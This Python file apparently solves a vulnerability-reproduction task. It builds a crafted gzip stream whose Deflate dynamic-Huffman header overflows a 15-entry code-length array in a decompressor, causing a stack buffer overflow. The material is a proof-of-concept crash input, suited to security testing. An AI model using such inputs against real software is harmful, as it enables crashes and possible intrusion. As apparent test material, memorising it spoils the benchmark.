import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # GZIP Header (10 bytes)
        # ID1(1f) ID2(8b) CM(08) FLG(00) MTIME(00000000) XFL(00) OS(03)
        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'
        
        # Payload (9 bytes)
        # Construct a Deflate Dynamic Huffman block that triggers a stack buffer overflow.
        # The vulnerability is typically in the array used to store code lengths for the code length alphabet.
        # The array is sized to 15, but the alphabet size is 19.
        # We set HCLEN = 15 (max), which implies 19 code length codes will be read.
        #
        # Bitstream construction (LSB first):
        # 1 bit: BFINAL = 1
        # 2 bits: BTYPE = 2 (Dynamic Huffman) -> binary 10
        # 5 bits: HLIT = 0
        # 5 bits: HDIST = 0
        # 4 bits: HCLEN = 15 -> binary 1111
        # ... bits: Code lengths (3 bits each) -> all 0s
        #
        # Byte 0: bits [1, 0, 1, 0, 0, 0, 0, 0] -> 0x05
        # Byte 1: bits [0, 0, 0, 0, 0, 1, 1, 1] -> 0xE0
        # Byte 2: bits [1, 0, 0, 0, 0, 0, 0, 0] -> 0x01
        # Bytes 3-8: 0x00 (Providing bits for the 19 code lengths to drive the loop)
        
        payload = b'\x05\xe0\x01\x00\x00\x00\x00\x00\x00'
        
        # Footer (8 bytes)
        # CRC32 (4 bytes) + ISIZE (4 bytes). 
        # Values don't matter as crash happens during decoding.
        footer = b'\x00' * 8
        
        return header + payload + footer